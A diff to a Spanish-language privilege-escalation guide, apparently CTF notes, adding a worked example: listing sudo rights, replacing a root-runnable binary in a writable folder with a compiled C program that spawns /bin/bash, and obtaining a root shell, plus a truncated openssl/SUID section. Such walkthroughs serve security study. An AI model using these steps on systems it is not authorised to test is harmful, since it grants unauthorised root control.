@@ -34,7 +34,61 @@ Una manera de escalar privilegios es a través del siguiente comando:
 ┌─[user@user]─[/]
 └──╼ sudo -l
 ```
-y ahí aparecerá un binario en el cuál podremos obtener acceso root siguiendo los pasos que nos indican en [GTFOBins](https://gtfobins.github.io/).
+y ahí aparecerá un binario en el cuál podremos obtener acceso root siguiendo los pasos que nos indican en [GTFOBins](https://gtfobins.github.io/) en algunos casos.
+
+### Ejemplo
+
+```bash
+┌─[user@user]─[/]
+└──╼ sudo -l
+Matching Defaults entries for randy on corrosion:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User randy may run the following commands on corrosion:
+    (root) PASSWD: /home/randy/tools/easysysinfo
+```
+
+Al obtener ese resultado nos debemos dirigir al directorio a observar de que se trata:
+
+```bash
+┌─[user@user]─[/tools]
+└──╼ ls
+easysysinfo  easysysinfo.py 
+```
+
+En este caso tenemos permisos para remover el archivo, por lo que lo eliminamos y creamos un binario por medio de C como el siguiente:
+
+```C
+// Nombre del archivo: test.c
+
+#include <stdlib.h>
+
+int main() {
+    system("/bin/bash");
+    return 0;
+}
+```
+
+Y lo compilamos y movemos en la carpeta de tools en caso sea necesario, para posteriormente ejecutarlo:
+
+```bash
+┌─[user@user]─[/tools]
+└──╼ gcc test.c -o easysysinfo
+
+┌─[user@user]─[/tools]
+└──╼ ls
+easysysinfo  easysysinfo.py  test.c
+
+┌─[user@user]─[/tools]
+└──╼ sudo -u root /home/randy/tools/easysysinfo
+
+┌─[root@user]─[/tools#]
+└──╼ whoami
+root
+```
+
+Y finalmente obtenemos acceso como usuario root, por lo que el programa funciona correctamente.
+
 
 ## Información del sistema
 
@@ -84,7 +138,9 @@ Ahora también podemos buscar todos los binarios SUID a través de ```find```, c
 /bin/umount
 ```
 
-Una vez detectamos algunos que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:
+### Ejemplo
+
+Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:
 
 ```bash
 ┌─[user@user]─[/]
